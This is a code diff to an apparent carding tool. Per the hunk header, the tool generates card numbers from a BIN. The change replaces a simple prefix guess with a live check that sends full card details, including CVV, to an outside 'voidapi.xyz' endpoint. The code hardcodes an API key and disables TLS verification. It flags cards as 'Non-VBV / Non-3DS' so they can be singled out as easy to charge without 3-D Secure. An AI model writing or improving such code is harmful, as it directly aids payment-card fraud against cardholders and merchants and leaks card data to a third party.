@@ -162,28 +162,72 @@ def generate_cards(bin_input: str, count: int = 10) -> List[str]:
 #  VBV / 3DS Lookup
 # ============================================================
 def vbv_lookup(cc_line):
-    """Simple VBV/3DS check based on card prefix."""
+    """Real VBV/3DS check via VoidAPI."""
     parts = cc_line.split('|')
     if not parts:
         return "Error | Invalid input"
     num = parts[0].strip()
-    if not num:
-        return "Error | Empty card number"
+    if not num or len(num) < 13:
+        return "Error | Invalid card number"
 
     brand = get_card_brand(num)
-    first = num[0] if num else '0'
+    cc = num
+    mm = parts[1].strip() if len(parts) > 1 else "01"
+    yy = parts[2].strip() if len(parts) > 2 else "30"
+    cvv = parts[3].strip() if len(parts) > 3 else "123"
 
-    # Simplified — real VBV requires enrollment check
-    if first == '4':
-        return f"Visa | Likely VBV/3DS Enrolled 🔒 | {brand.upper()}"
-    elif first == '5' or first == '2':
-        return f"Mastercard | Likely SecureCode/3DS 🔒 | {brand.upper()}"
-    elif first == '3':
-        return f"Amex | SafeKey may apply 🔒 | {brand.upper()}"
-    elif first == '6':
-        return f"Discover | ProtectBuy may apply | {brand.upper()}"
-    else:
-        return f"Unknown Brand | 3DS status unknown | BIN: {num[:6]}"
+    VOIDAPI_KEY = "VDX-SHA2X-NZ0RS-O7HAM"
+    LIVE_STATUSES = [
+        "authenticate_successful", "authenticate_attempt_successful",
+        "authentication_successful", "authentication_attempt_successful",
+        "three_d_secure_passed", "three_d_secure_authenticated",
+        "three_d_secure_attempted", "liability_shifted",
+        "liability_shift_possible", "frictionless_flow", "challenge_not_required",
+    ]
+
+    try:
+        import urllib3
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+        headers = {
+            "Accept": "*/*",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
+            "Cache-Control": "no-cache",
+        }
+        url = f"https://api.voidapi.xyz/v2/vbv??key={VOIDAPI_KEY}&card={cc}|{mm}|{yy}|{cvv}"
+
+        for attempt in range(3):
+            try:
+                r = requests.get(url, headers=headers, timeout=35, verify=False)
+                text = r.text.strip()
+                if "524: A timeout occurred" in text:
+                    if attempt < 2:
+                        import time
+                        time.sleep(5)
+                        continue
+                    return f"{brand.upper()} | ⚠️ API Timeout | BIN: {num[:6]}"
+
+                def _gstr(src, a, b):
+                    try:
+                        return src.split(a, 1)[1].split(b, 1)[0]
+                    except Exception:
+                        return ""
+
+                status = _gstr(text, 'status":"', '"') or "Card type not support."
+
+                if status in LIVE_STATUSES:
+                    return f"{brand.upper()} | ✅ Non-VBV / Non-3DS | {status} | BIN: {num[:6]}"
+                else:
+                    return f"{brand.upper()} | 🔒 VBV/3DS Enrolled | {status} | BIN: {num[:6]}"
+
+            except Exception:
+                if attempt < 2:
+                    import time
+                    time.sleep(1)
+                    continue
+                return f"{brand.upper()} | ⚠️ Check Failed | BIN: {num[:6]}"
+
+    except Exception as e:
+        return f"{brand.upper()} | Error: {str(e)[:40]} | BIN: {num[:6]}"
 
 
 # ============================================================
